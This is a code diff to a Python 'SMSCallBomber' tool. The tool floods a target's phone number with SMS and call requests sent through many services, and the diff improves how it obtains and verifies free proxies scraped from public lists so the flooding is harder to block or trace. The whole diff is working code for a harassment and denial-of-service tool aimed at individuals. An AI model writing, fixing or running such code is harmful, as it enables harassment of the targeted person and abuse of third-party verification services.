@@ -19,6 +19,7 @@ def get_services(country_code, number):
 
 class SMSCallBomber(threading.Thread):
     def __init__(self, args):
+        super().__init__()
         self.args = args
         if self.args.country == '7':
             self.country_code = 'RU'
@@ -42,6 +43,7 @@ class SMSCallBomber(threading.Thread):
             )
         else:
             logging.basicConfig(handlers=[logging.NullHandler()])
+        self.proxy = None
         self.services = get_services(self.country_code, self.args.phone)
         self.successful_count = 0
         self.failed_count = 0
@@ -52,6 +54,7 @@ class SMSCallBomber(threading.Thread):
 
     async def _run(self):
         async with ClientSession(timeout=ClientTimeout(total=self.args.timeout)) as session:
+            self.proxy = self.args.proxy if self.args.proxy is not True else await self.generate_proxy(session)
             tasks = []
             for _ in range(self.args.threads):
                 task = asyncio.create_task(self.attack(session))
@@ -62,10 +65,9 @@ class SMSCallBomber(threading.Thread):
     async def attack(self, session):
         local_successful_count = 0
         local_failed_count = 0
-        proxy = self.args.proxy if self.args.proxy is not True else await self.generate_proxy(session)
         while self.running and time.time() < self.args.time and self.services:
             service_info = random.choice(self.services)
-            service = Service(service_info, self.args.phone, self.args.timeout, proxy)
+            service = Service(service_info, self.args.phone, self.args.timeout, self.proxy)
             domain_name = service.get_domain_name()
             try:
                 status_code = await service.send_request(session)
@@ -109,33 +111,31 @@ class SMSCallBomber(threading.Thread):
 
     @staticmethod
     async def check_proxy(proxy, session):
-        try:
-            async with session.get("http://ipinfo.io/json", proxy=f"http://{proxy}", timeout=3) as res:
-                return res.status == 200
-        except:
-            return False
+        schemes = ["https", "http"]
+        for scheme in schemes:
+            try:
+                proxy_url = f"{scheme}://{proxy}"
+                async with session.get(f"{scheme}://httpbin.org/ip", proxy=proxy_url, timeout=3) as res:
+                    if res.status == 200:
+                        data = await res.json()
+                        ip_from_proxy = data.get("origin", "")
+                        if proxy.split(":")[0] in ip_from_proxy:
+                            return proxy_url
+            except Exception:
+                continue
+        return False
 
     async def generate_proxy(self, session):
         proxy_sources = [
-            "https://api.openproxylist.xyz/http.txt",
-            "https://www.proxy-list.download/api/v1/get?type=http",
-            "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
             "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
-            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
             "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
             "https://www.sslproxies.org/",
-            "https://www.proxy-list.download/api/v1/get?type=https",
-            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
-            "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
             "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
-            'https://www.sslproxies.org/',
-            'https://www.google-proxy.net/',
-            'https://free-proxy-list.net/anonymous-proxy.html',
-            'https://free-proxy-list.net/uk-proxy.html',
-            'https://www.us-proxy.org/',
-            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
-            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all',
-            'https://free-proxy-list.net/'
+            "https://www.google-proxy.net/",
+            "https://free-proxy-list.net/anonymous-proxy.html",
+            "https://free-proxy-list.net/uk-proxy.html",
+            "https://www.us-proxy.org/",
+            "https://free-proxy-list.net/"
         ]
         random.shuffle(proxy_sources)
         for url in proxy_sources:
@@ -144,8 +144,9 @@ class SMSCallBomber(threading.Thread):
                 continue
             random.shuffle(proxies)
             for proxy in proxies:
-                if await self.check_proxy(proxy, session):
-                    return f"http://{proxy}"
+                proxy_url = await self.check_proxy(proxy, session)
+                if proxy_url:
+                    return proxy_url
         return None
 
     def send_report(self):
